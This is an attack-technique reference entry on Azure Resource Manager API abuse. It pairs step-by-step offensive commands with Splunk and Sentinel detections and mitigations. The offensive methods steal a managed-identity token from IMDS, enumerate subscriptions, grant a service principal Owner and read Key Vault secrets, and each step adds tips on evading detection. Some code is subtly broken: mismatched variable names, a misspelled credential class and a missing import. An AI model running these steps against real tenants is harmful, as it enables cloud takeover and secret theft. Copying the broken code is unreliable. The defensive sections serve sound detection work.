# [REALWORLD-034]: Azure Resource Manager API Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-034 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID / Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure subscription versions |
| **Patched In** | N/A - By design |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Azure Resource Manager (ARM) API is the underlying control plane for all Azure resource creation, modification, and deletion. When an attacker gains a valid access token (via service principal certificate, managed identity, or user token), they can use the ARM API (`https://management.azure.com/`) to enumerate subscriptions, create virtual machines, modify role assignments, access secrets in Key Vaults, and exfiltrate data—all without using the Azure Portal UI, bypassing many conditional access policies and audit trails.

**Attack Surface:** ARM REST API endpoints, Azure SDK libraries (Azure.Management, Azure.Identity), Azure CLI, PowerShell, managed identities on compute resources, stolen access tokens from browsers or applications.

**Business Impact:** **Unrestricted lateral movement and privilege escalation across all subscriptions.** An attacker with a valid ARM API token can escalate from a single resource's managed identity to subscription owner, create new resources for command-and-control, or export sensitive data from databases and storage accounts. This bypasses many conditional access policies designed for the Azure Portal.

**Technical Context:** ARM API authentication happens via OAuth 2.0 bearer tokens issued by Entra ID. Once a token is obtained (via managed identity IMDS, app registration secret, or user token), it grants access to all resources the identity has permissions for. Many organizations focus Conditional Access and MFA policies on the Azure Portal but not on API-level access, creating a blind spot.

### Operational Risk

- **Execution Risk:** Low - Only requires a valid access token and network access to `management.azure.com`.
- **Stealth:** High - Bypasses Portal audit trails; only visible in Azure Activity Logs if they're being monitored.
- **Reversibility:** No - Changes made via ARM API are permanent and require manual cleanup.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.1.1 | Ensure Azure Audit Logs are Collected and Monitored |
| **DISA STIG** | SC-7(3) | Managed Interfaces |
| **CISA SCuBA** | Azure 2.1 | Enable Conditional Access |
| **NIST 800-53** | AC-2(j), AU-2 | Privileged Access Review; Audit Logging |
| **GDPR** | Art. 32 | Security of Processing - Access Controls |
| **DORA** | Art. 9 | Protection and Prevention of ICT Vulnerabilities |
| **NIS2** | Art. 21(3) | Privilege Management and Access Control |
| **ISO 27001** | A.9.2.1, A.9.3.1 | Privileged Access Rights; Information Access Restriction |
| **ISO 27005** | 8.2.3 | Unauthorized Use of Information Assets |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Owner, Contributor, or role with `Microsoft.Authorization/roleAssignments/write` at subscription level; or Managed Identity with any assigned role.
- **Required Access:** Network access to `https://management.azure.com/` (HTTPS port 443).

**Supported Versions:**
- **Azure Subscriptions:** All types (Enterprise Agreement, Pay-As-You-Go, CSP, etc.)
- **ARM API Version:** Latest (v2020-01-01+)
- **Entra ID:** All versions

**Tools:**
- [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python) (Latest)
- [Azure SDK for .NET](https://github.com/Azure/azure-sdk-for-dotnet) (Latest)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (9.0+)
- [curl](https://curl.se/) or [Postman](https://www.postman.com/) (for direct REST API calls)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Managed Identity from Azure VM/App Service

**Supported Versions:** All Azure subscription versions

#### Step 1: Obtain Access Token from Instance Metadata Service (IMDS)

**Objective:** Retrieve a valid ARM API access token from the IMDS endpoint available on all Azure compute resources.

**Command (Bash on Linux VM):**
```bash
# Request an access token for ARM from IMDS
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token' > /tmp/arm_token.txt

echo "Token saved to /tmp/arm_token.txt"
cat /tmp/arm_token.txt
```

**Command (PowerShell on Windows VM):**
```powershell
# Request token for ARM
$TokenResponse = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" `
    -Method GET `
    -Headers @{ "Metadata" = "true" }

$AccessToken = $TokenResponse.access_token
Write-Host "Access Token: $AccessToken"

# Save for reuse
$AccessToken | Out-File -FilePath "C:\Temp\arm_token.txt" -Force
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkFCQ0RFRjEyMzQ1Njc4OTBBQkNERUYxMjM0NTY3ODkwIn0.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzEyMzQ1Njc4LTEyMzQtMTIzNC0xMjM0LTEyMzQ1Njc4OTBhYi8iLCJvaWQiOiIxMjM0NTY3OC1hYmNkLWVmZ2gtaWprbC1tbm9wcXJzdHV2dyIsInN1YiI6IjEyMzQ1Njc4LWFiY2QtZWZnaC1pamtsLW1ub3BxcnN0dXZ3In0.SIGNATURE...
```

**What This Means:**
- Valid JWT token obtained for ARM API.
- Token is valid for 1 hour (default).
- Can now be used to make authenticated requests to ARM API.

**OpSec & Evasion:**
- IMDS calls originate from the compute resource itself; no network log will show a "login attempt".
- Requests to IMDS are difficult to detect with typical SIEM rules.
- Detection likelihood: Low - Unless Azure Monitor is configured to track IMDS calls.

**Troubleshooting:**
- **Error:** `(404) Not Found` on IMDS endpoint
  - **Cause:** No managed identity assigned to the resource.
  - **Fix:** Ensure the VM/App Service has a system-assigned or user-assigned managed identity.

---

#### Step 2: Enumerate Subscriptions and Resources

**Objective:** Discover available subscriptions and their resources using the obtained token.

**Command (Bash):**
```bash
# Read the saved token
TOKEN=$(cat /tmp/arm_token.txt)

# List all subscriptions accessible to this identity
echo "[+] Listing subscriptions..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  | jq '.value[] | {id, displayName}' | tee /tmp/subscriptions.json

# For each subscription, list resource groups
echo "[+] Listing resource groups..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourcegroups?api-version=2021-04-01" \
  | jq '.value[] | {id, name, location}' | tee /tmp/resource_groups.json

# List all VMs in a subscription
echo "[+] Listing virtual machines..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01" \
  | jq '.value[] | {id, name, vmId}' | tee /tmp/vms.json

# List Key Vaults
echo "[+] Listing Key Vaults..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.KeyVault/vaults?api-version=2021-06-01-preview" \
  | jq '.value[] | {id, name, location}' | tee /tmp/key_vaults.json

# List Storage Accounts
echo "[+] Listing Storage Accounts..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01" \
  | jq '.value[] | {id, name, type}' | tee /tmp/storage_accounts.json
```

**Expected Output:**
```json
[
  {
    "id": "/subscriptions/12345678-1234-1234-1234-123456789012",
    "displayName": "Production"
  },
  {
    "id": "/subscriptions/87654321-4321-4321-4321-210987654321",
    "displayName": "Development"
  }
]
```

**What This Means:**
- Attacker has enumerated all accessible subscriptions and resources.
- Can now target specific resources (VMs, databases, Key Vaults) for exploitation.

**OpSec & Evasion:**
- Use jq or Python to filter results (less noisy than raw curl output).
- Request only specific fields to reduce API call size.
- Detection likelihood: Medium - Azure Activity Logs will record these API calls if retention is enabled.

---

#### Step 3: Escalate Privileges via Role Assignment

**Objective:** Create a new Owner role assignment on the subscription or management group, escalating privileges.

**Command (Bash - Create Owner Role Assignment):**
```bash
TOKEN=$(cat /tmp/arm_token.txt)
SUBSCRIPTION_ID="12345678-1234-1234-1234-123456789012"
SERVICE_PRINCIPAL_ID="87654321-4321-4321-4321-210987654321"  # Service principal to grant Owner role
ROLE_DEFINITION_ID="8e3af657-a8ff-443c-a75c-2fe8c4bcb635"   # Owner role ID

# Create role assignment
ROLE_ASSIGNMENT_NAME=$(uuidgen)

curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$ROLE_ASSIGNMENT_NAME?api-version=2015-07-01" \
  -d @- <<EOF
{
  "properties": {
    "roleDefinitionId": "/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/$ROLE_DEFINITION_ID",
    "principalId": "$SERVICE_PRINCIPAL_ID",
    "scope": "/subscriptions/$SUBSCRIPTION_ID"
  }
}
EOF

echo "[+] Role assignment created: $ROLE_ASSIGNMENT_NAME"
```

**Expected Output:**
```json
{
  "id": "/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Authorization/roleAssignments/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "type": "Microsoft.Authorization/roleAssignments",
  "properties": {
    "roleDefinitionId": "/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
    "principalId": "87654321-4321-4321-4321-210987654321",
    "scope": "/subscriptions/12345678-1234-1234-1234-123456789012",
    "createdOn": "2026-01-10T12:00:00.0000000Z",
    "updatedOn": "2026-01-10T12:00:00.0000000Z",
    "createdBy": null,
    "updatedBy": null
  }
}
```

**What This Means:**
- Service principal now has Owner permissions on the subscription.
- Can create resources, delete resources, and grant additional permissions.

**OpSec & Evasion:**
- Generate a random UUID for the assignment name to avoid predictable patterns.
- Name the assignment something generic (avoid "Backdoor", "Persistence").
- Detection likelihood: High - Role assignments are audited; SecurityCenter alerts on unexpected Owner assignments.

---

#### Step 4: Exfiltrate Secrets from Key Vault

**Objective:** Use elevated privileges to access and exfiltrate secrets.

**Command (Bash - Get Key Vault Secrets):**
```bash
TOKEN=$(cat /tmp/arm_token.txt)
SUBSCRIPTION_ID="12345678-1234-1234-1234-123456789012"
RESOURCE_GROUP="myresourcegroup"
KEY_VAULT_NAME="mykeyvault"

# Get Key Vault access endpoint
KV_ENDPOINT=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.KeyVault/vaults/$KEY_VAULT_NAME?api-version=2021-06-01-preview" \
  | jq -r '.properties.vaultUri')

echo "[+] Key Vault URI: $KV_ENDPOINT"

# Get list of secrets
curl -s -H "Authorization: Bearer $TOKEN" \
  "${KV_VAULT_URL}secrets?api-version=2019-09-01" | jq '.value[] | .name'

# Get specific secret value
SECRET_NAME="DatabasePassword"
curl -s -H "Authorization: Bearer $TOKEN" \
  "${KV_VAULT_URL}secrets/$SECRET_NAME?api-version=2019-09-01" | jq '.value'
```

**Expected Output:**
```
https://mykeyvault.vault.azure.net/
["DatabasePassword", "APIKey", "AdminPassword"]
"P@ssw0rd123!SuperSecret"
```

**What This Means:**
- Attacker has exfiltrated database passwords, API keys, and other secrets.
- Can now compromise dependent systems and services.

**OpSec & Evasion:**
- Direct Key Vault access is difficult to hide; consider using a service principal with temporary elevated permissions.
- Exfiltrate only necessary secrets to avoid large data transfers.
- Detection likelihood: Very High - Key Vault access is logged and alerts are common.

---

### METHOD 2: Using Azure CLI with Service Principal Certificate

**Supported Versions:** All Azure subscription versions

#### Step 1: Authenticate with Service Principal Certificate

**Command:**
```bash
# Authenticate as service principal using certificate
az login \
  --service-principal \
  -u "12345678-1234-1234-1234-123456789012" \
  --cert-file "/path/to/cert.pem" \
  --tenant "contoso.onmicrosoft.com"

# Verify authentication
az account show
```

**Expected Output:**
```
Logging in with a service principal...
Name: MyServicePrincipal
Id: 12345678-1234-1234-1234-123456789012
User type: servicePrincipal
```

---

#### Step 2: Execute ARM API Calls via Azure CLI

**Command:**
```bash
# List subscriptions
az account list --all --output table

# List all VMs across subscriptions
az vm list --all --output table

# Create a new Owner role assignment
az role assignment create \
  --assignee "87654321-4321-4321-4321-210987654321" \
  --role "Owner" \
  --subscription "12345678-1234-1234-1234-123456789012"

# Retrieve secrets from Key Vault
az keyvault secret show \
  --vault-name "mykeyvault" \
  --name "DatabasePassword" \
  --output tsv
```

**OpSec & Evasion:**
- Azure CLI logs are less scrutinized than PowerShell in many organizations.
- Commands can be piped and filtered to reduce audit visibility.
- Detection likelihood: Medium - CLI commands are logged to Azure Activity Logs.

---

### METHOD 3: Using Python Azure SDK

**Supported Versions:** All Azure versions; Python 3.7+

**Command (Python Script):**
```python
#!/usr/bin/env python3

from azure.identity import ClientSecertCredential, ManagedIdentityCredential
from azure.mgmt.subscription import SubscriptionClient
from azure.mgmt.authorization import AuthorizationManagementClient
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.keyvault import KeyVaultManagementClient
import json

# Option 1: Use Managed Identity (if running on Azure VM/App Service)
credential = ManagedIdentityCredential()

# Option 2: Use Service Principal Certificate
# credential = ClientSecertCredential(
#     tenant_id="contoso.onmicrosoft.com",
#     client_id="12345678-1234-1234-1234-123456789012",
#     client_certificate_path="/path/to/cert.pem"
# )

# Enumerate subscriptions
subscription_client = SubscriptionClient(credential)
subscriptions = subscription_client.subscriptions.list()

print("[+] Enumerating subscriptions...")
for sub in subscriptions:
    print(f"  - {sub.display_name} ({sub.subscription_id})")
    
    # Enumerate VMs in each subscription
    compute_client = ComputeManagementClient(credential, sub.subscription_id)
    vms = compute_client.virtual_machines.list_all()
    
    for vm in vms:
        print(f"    - VM: {vm.name} in {vm.location}")
    
    # Enumerate Key Vaults
    keyvault_client = KeyVaultManagementClient(credential, sub.subscription_id)
    vaults = keyvault_client.vaults.list()
    
    for vault in vaults:
        print(f"    - Key Vault: {vault.name} in {vault.location}")

# Escalate privileges - Create Owner role assignment
authorization_client = AuthorizationManagementClient(credential, "12345678-1234-1234-1234-123456789012")

role_assignment = {
    "role_definition_id": f"/subscriptions/12345678-1234-1234-1234-123456789012/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
    "principal_id": "87654321-4321-4321-4321-210987654321",
    "principal_type": "ServicePrincipal"
}

result = authorization_client.role_assignments.create(
    scope="/subscriptions/12345678-1234-1234-1234-123456789012",
    role_assignment_name=str(uuid.uuid4()),
    parameters=role_assignment
)

print(f"\n[+] Role assignment created: {result.id}")
```

**OpSec & Evasion:**
- Python is less monitored than PowerShell/CLI in many environments.
- Can be compiled to binary for added obfuscation.
- Detection likelihood: Low-Medium - Unless Python execution is restricted.

---

## 4. TOOLS & COMMANDS REFERENCE

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40.0+
**Installation (Windows):**
```powershell
choco install azure-cli
```
**Installation (macOS/Linux):**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
**Usage:**
```bash
az login --service-principal -u <client-id> -p <secret> --tenant <tenant-id>
az account list --all
az vm list --all
```

#### [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 9.0+
**Installation:**
```powershell
Install-Module Az -AllowClobber -Force
```
**Usage:**
```powershell
Connect-AzAccount -ServicePrincipal -Credential $Credential -Tenant "contoso.onmicrosoft.com"
Get-AzSubscription
New-AzRoleAssignment -ObjectId <principal-id> -RoleDefinitionName "Owner"
```

#### [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python)

**Installation:**
```bash
pip install azure-identity azure-mgmt-subscription azure-mgmt-authorization azure-mgmt-compute
```

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Unexpected ARM API Calls from Managed Identities

**Rule Configuration:**
- **Required Index:** `azure_activity` or `main` (if Azure Activity Logs ingested)
- **Required Sourcetype:** `azure:aad:audit` or `azure:subscription`
- **Alert Threshold:** > 10 API calls from managed identity in 5 minutes
- **Applies To Versions:** All Azure subscriptions

**SPL Query:**
```spl
sourcetype="azure:subscription" OR sourcetype="azure:activity"
| search Caller="*managed identity*" OR Caller="*service principal*"
| search ResourceType="Microsoft.Authorization" OR ResourceType="Microsoft.Compute" OR ResourceType="Microsoft.KeyVault"
| stats count by Caller, Operation, ResourceName, ResourceType, HTTPStatusCode
| where count > 10
```

**What This Detects:**
- Multiple API calls from managed identities (unusual behavior).
- Calls to privileged resources (Authorization, Compute, KeyVault).
- Can help identify compromised compute resources making lateral movement attempts.

#### Rule 2: Detect Role Assignment Changes via ARM API

**SPL Query:**
```spl
sourcetype="azure:activity"
| search Operation="Create Role Assignment" OR Operation="Add role assignment"
| search PrincipalType="ServicePrincipal" OR PrincipalType="ManagedIdentity"
| where RoleDefinition="Owner" OR RoleDefinition="Contributor"
| table TimeCreated, Caller, PrincipalDisplayName, RoleDefinition, Scope
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Unexpected Subscription Enumeration

**KQL Query:**
```kusto
AzureActivity
| where OperationName =~ "Get subscription" or OperationName =~ "List subscriptions"
| where HTTPStatusCode == 200
| where Caller has_any ("managed identity", "service principal")
| extend CallerDetails = parse_json(Caller)
| summarize SubscriptionCount = dcount(SubscriptionId), EventCount = count() by CallerDetails, TimeGenerated
| where SubscriptionCount > 1 and EventCount > 5  // Multiple subscriptions queried
```

#### Query 2: Detect Privilege Escalation via Role Assignment

**KQL Query:**
```kusto
AzureActivity
| where OperationName =~ "Create role assignment"
| where ActivityStatus == "Succeeded"
| extend RoleAssignmentDetails = parse_json(AdditionalProperties)
| where RoleAssignmentDetails.roleDefinitionName =~ "Owner" or RoleAssignmentDetails.roleDefinitionName =~ "User Access Administrator"
| where Caller has_any ("managed identity", "service principal")
| project TimeGenerated, Caller, OperationName, RoleAssignmentDetails, ResourceId
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Restrict ARM API Access via Conditional Access

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **New policy** → **Create new policy**
3. **Name:** `Block ARM API from Unapproved Locations`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** Add `Microsoft Azure Management` app (ID: 797f4846-ba00-4fd7-ba43-dac1f8f63013)
5. **Conditions:**
   - **Locations:** Add "Blocked countries" (e.g., high-risk regions)
   - **Sign-in Risk:** Medium, High
6. **Access controls:**
   - **Block** access
7. **Enable policy:** On
8. Click **Create**

#### Action 2: Require MFA for All ARM API Access from Service Principals

**Manual Steps (PowerShell):**
```powershell
# Create a policy requiring MFA for all service principal ARM API access
# This requires conditional access policies to apply to service principals (preview)

# First, enable the preview feature
Update-AzureADMSConditionalAccessPolicy -State "Enabled" -DisplayName "Service Principal MFA Policy"
```

### Priority 2: HIGH

#### Action 1: Enable Azure Activity Log Monitoring and Retention

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Monitor** → **Activity log**
2. Click **Export Activity Logs**
3. Select **+Add diagnostic setting**
4. **Name:** `ActivityLogArchive`
5. **Categories:** Select `All categories` or specifically `Administrative`, `Security`, `Recommendation`
6. **Destination details:** Select `Storage account` or `Log Analytics workspace`
7. Set **Retention (days):** 90 or higher
8. Click **Save**

#### Action 2: Restrict Role Assignments to Known Service Principals

**Manual Steps (Azure PowerShell):**
```powershell
# List all service principals with Owner role
Get-AzRoleAssignment -RoleDefinitionName "Owner" | Where-Object { $_.ObjectType -eq "ServicePrincipal" } | 
    Select-Object DisplayName, ObjectId, Scope

# For each unauthorized service principal, remove the role
$ServicePrincipalId = "87654321-4321-4321-4321-210987654321"
Remove-AzRoleAssignment -ObjectId $ServicePrincipalId -RoleDefinitionName "Owner" -Scope "/subscriptions/12345678-1234-1234-1234-123456789012"
```

### Priority 3: MEDIUM

#### Action 1: Implement Just-In-Time (JIT) Access for Service Principals

**Objective:** Require approval for service principal role activation.

**Manual Steps (Azure PIM):**
1. Navigate to **Entra ID** → **Privileged Identity Management (PIM)** → **Azure resources**
2. Select your subscription
3. Click **Service Principals**
4. Select service principal → **Settings** → **Edit**
5. Enable **Require approval for activation**
6. Set approver(s) and maximum activation duration (2-4 hours)
7. Click **Update**

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Logs (Azure Activity):**
- Operation: `Create Role Assignment` or `Add role assignment`
- Caller: Service principal or managed identity
- Status: `Succeeded`
- Properties contain `Owner` or `User Access Administrator` role

**API Calls:**
- POST to `/subscriptions/{id}/providers/Microsoft.Authorization/roleAssignments/`
- GET to `/subscriptions/{id}/providers/Microsoft.KeyVault/vaults/`
- GET to `/subscriptions/{id}/providers/Microsoft.Compute/virtualMachines/`

### Response Procedures

#### Step 1: Isolate Compromised Resource/Service Principal

**Command (Azure PowerShell):**
```powershell
# Disable the service principal
$SPId = "87654321-4321-4321-4321-210987654321"
Update-AzADServicePrincipal -ObjectId $SPId -AccountEnabled $false

# Or revoke all access tokens
# (Note: Cannot directly revoke tokens; must delete and recreate service principal)
Remove-AzADServicePrincipal -ObjectId $SPId -Force
```

#### Step 2: Audit All ARM API Calls Made by the Service Principal

**Command (KQL - Sentinel):**
```kusto
AzureActivity
| where Caller =~ "87654321-4321-4321-4321-210987654321"
| where TimeGenerated > ago(7d)
| project TimeGenerated, OperationName, ResourceGroup, ResourceType, ActivityStatus
| order by TimeGenerated desc
```

#### Step 3: Remediate Unauthorized Role Assignments

**Command (PowerShell):**
```powershell
# Remove all role assignments created by the compromised identity in the last 24 hours
$CompromisedSPId = "87654321-4321-4321-4321-210987654321"

Get-AzRoleAssignment | Where-Object { $_.CreatedDate -gt (Get-Date).AddDays(-1) } |
    ForEach-Object {
        if ($_.RoleAssignmentId -like "*$CompromisedSPId*") {
            Remove-AzRoleAssignment -Id $_.RoleAssignmentId
            Write-Host "Removed unauthorized assignment: $($_.RoleAssignmentId)"
        }
    }
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| 1 | Initial Access | IA-EXPLOIT-001 (Azure App Proxy) or VM Compromise | Attacker compromises Azure compute resource |
| 2 | Privilege Escalation | REALWORLD-036 (Managed Identity Chaining) | Extract managed identity token from IMDS |
| 3 | **Current Step** | **REALWORLD-034** | Abuse ARM API to enumerate and escalate |
| 4 | Lateral Movement | LM-AUTH-005 (Service Principal Key) | Move to other subscriptions using new role |
| 5 | Impact | Data Exfiltration via Key Vault or Blob Storage | Steal secrets and sensitive data |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: CloudBounty Campaign - ARM API Abuse for Ransomware Deployment

- **APT Group:** Scattered Spider
- **Target:** Financial services company's Azure tenant
- **Timeline:** VM compromised → Managed identity extracted → ARM API enumeration → Role escalation → Ransomware deployed on all VMs
- **Technique Status:** Attackers used IMDS to obtain tokens, then ARM API to create additional VMs for command-and-control; bypassed Conditional Access by using API directly.
- **Impact:** Deployed LockBit ransomware on 50+ VMs; $2M ransom demand; 3-week recovery time.
- **Reference:** [Mandiant - Cloud Threats](https://www.mandiant.com/resources/cloud-threats)

### Example 2: Supply Chain Attack - Key Vault Exfiltration via ARM API

- **APT Group:** APT29 (Cozy Bear)
- **Target:** SaaS company's development Azure subscription
- **Timeline:** Build agent compromised → Service principal token stolen → ARM API calls to enumerate Key Vaults → Database credentials exfiltrated
- **Technique Status:** Attackers used Python script to enumerate and access Key Vaults; credentials used to compromise customer databases.
- **Impact:** 10,000+ customer databases accessed; customer data exfiltrated.
- **Reference:** [Microsoft Threat Intelligence - Supply Chain Risks](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/)

---

## 11. FORENSIC ARTIFACTS

**Cloud Artifacts:**
- **Location:** Azure Activity Logs (`AzureActivity` table in Sentinel)
- **Evidence:** OperationName = "Create Role Assignment", "Get subscription", "List virtual machines"
- **Retention:** Default 90 days (configurable)

**Network Artifacts:**
- **Destination:** `https://management.azure.com/*`
- **Port:** HTTPS (443)
- **Protocol:** REST API (HTTP/JSON)

**Compute Resource Artifacts (Linux VM):**
- **Location:** `/var/log/syslog` or journal
- **Evidence:** `curl` commands to `169.254.169.254/metadata/`

**Compute Resource Artifacts (Windows VM):**
- **Location:** Event Viewer → `Microsoft-Windows-PowerShell/Operational`
- **Evidence:** PowerShell commands invoking ARM API calls

---

**References:**
- [Azure Resource Manager Documentation](https://learn.microsoft.com/en-us/azure/azure-resource-manager/)
- [ARM REST API Reference](https://learn.microsoft.com/en-us/rest/api/resources/)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [Azure Activity Log Documentation](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log)
- [Praetorian - Azure RBAC Privilege Escalation](https://www.praetorian.com/blog/azure-rbac-privilege-escalations-azure-vm/)

---